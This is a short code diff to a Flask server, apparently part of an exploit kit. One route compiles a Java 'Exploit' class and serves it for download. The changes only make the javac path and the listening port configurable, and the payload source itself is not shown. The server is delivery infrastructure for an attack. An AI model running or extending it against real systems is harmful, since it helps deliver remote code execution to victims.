@@ -1,5 +1,6 @@
 from flask import Flask, send_file, request
 import os
+import sys
 import subprocess
 
 app = Flask(__name__)
@@ -83,9 +84,14 @@ def exploit_class():
     with open("Exploit.java", "w") as f:
         f.write(java_src)
 
-    subprocess.run(["/usr/lib/jvm/java-8-openjdk-amd64/bin/javac", "Exploit.java"])
+    subprocess.run(["javac", "Exploit.java"])
 
     return send_file("Exploit.class", as_attachment=True, attachment_filename="Exploit.class")
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=8080)
+    if len(sys.argv) == 2:
+        port = int(sys.argv[1])
+    else:
+        port = 8001
+
+    app.run(host="0.0.0.0", port=port)
